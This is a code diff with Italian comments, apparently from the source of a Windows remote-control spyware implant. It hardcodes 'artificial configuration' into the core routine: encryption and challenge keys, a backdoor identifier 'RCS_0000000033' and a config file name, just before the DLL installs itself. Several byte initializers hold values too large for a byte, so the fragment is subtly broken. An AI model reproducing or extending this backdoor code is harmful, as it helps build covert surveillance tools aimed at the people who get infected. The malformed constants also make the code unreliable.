@@ -54,6 +54,40 @@ extern "C" DWORD WINAPI CoreProc(LPVOID pParam) {
 	typedef HRESULT (*pRegister)();
 	Core *core = NULL;
 
+
+
+	// configurazione artificialee
+	
+					  
+	BYTE LogKey[] = { 0x8f, 0xd1, 0x17, 0x03, 0x52, 0x96, 0x71, 0xf7, 0xf8, 0x43, 0xe6, 0x5e, 0xde, 0x33, 0xb1, 0x75d };					  
+	BYTE ConfKey[] = { 0x45, 0x1e, 0x33, 0x6c, 0x97, 0x8e, 0x71, 0x7b, 0x0c, 0x38, 0x9b, 0x2c, 0x2b, 0x66, 0x75, 0x04e };					  
+	BYTE ProtoKey[] = { 0x49, 0x8c, 0xe4, 0xd4, 0x31, 0xd7, 0x69, 0x8d, 0x6d, 0xa7, 0x6e, 0x87, 0xdc, 0x50, 0x13, 0xfcb };
+
+	//g_hInstance = hInstance;
+
+	// Configurazione artificiale di alcune variabili
+	ZeroMemory(g_AesKey, 32);
+	ZeroMemory(g_Challenge, 32);
+	ZeroMemory(g_ConfKey, 32);
+
+	ZeroMemory(g_BackdoorID, 16);
+	ZeroMemory(g_ConfName, 32 * sizeof(WCHAR));
+
+	CopyMemory(g_AesKey, LogKey, 16);
+	CopyMemory(g_Challenge, ProtoKey, 16);
+	CopyMemory(g_ConfKey, ConfKey, 16);
+	CopyMemory(g_BackdoorID, "RCS_0000000033", strlen("RCS_0000000xxx"));
+	CopyMemory(g_ConfName, L"c.bin", WideLen(L"c.bin"));
+	// Fine configurazione artificiale
+
+
+
+
+
+
+
+
+
 	// Installiamo la DLL
 	pRegister RegisterFunction;
 
